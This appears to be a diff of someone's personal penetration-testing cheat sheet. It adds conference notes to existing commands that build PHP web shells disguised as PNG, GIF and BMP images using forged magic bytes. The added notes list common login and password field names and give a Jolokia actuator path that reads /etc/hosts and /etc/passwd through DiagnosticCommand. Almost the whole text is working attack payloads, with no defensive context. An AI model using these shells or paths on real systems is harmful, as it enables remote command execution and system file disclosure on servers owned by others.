@@ -54,3 +54,26 @@ echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > shell.png
 echo -n -e '\x47\x49\x46\x38<?php system($_GET["cmd"]);?>.' > shell.gif
 
 echo -n -e '\x42\x4D<?php system($_GET["cmd"]);?>.' > shell.bmp
+
+
+-------
+
+
+ORWA Notes from IWCON:
+
+Login wordlists and passwords:
+
+password
+passwd
+pwd
+pass
+secret
+ldap
+
+Jolokia RCE:
+/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/hosts
+
+-------
+
+DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+
